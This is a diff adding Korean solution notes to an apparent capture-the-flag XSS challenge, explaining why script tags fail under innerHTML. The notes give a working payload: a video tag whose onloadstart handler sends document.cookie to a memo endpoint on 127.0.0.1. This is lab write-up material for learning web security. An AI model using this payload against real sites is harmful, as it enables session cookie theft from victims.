@@ -1,6 +1,13 @@
 '''
 !!solution!!
+- xss1과 비슷하지만 /vuln은 innerHTML로 처리하고 있다.
+- 따라서 GET, POST 둘다 script를 보내도 먹히지 안흔다.
+- HTML tag 속성을 이용해서 풀어본다.
 
+- xss1과 비슷하게 /vuln으로 location.href, document.cookie를 이용해야하므로 /vuln 요청과 동시에 실행되는 HTML tag가 필요하다.
+- video tag의 onloadstart attribute를 사용한다.
+    - <video controls onloadstart="javascript:location.href='http://127.0.0.1:8000/memo?memo=' + document.cookie"><source src="11" type="video/mp4"></video>
+- 이후 방식은 xss1과 동일하다.
 '''
 
 #!/usr/bin/python3
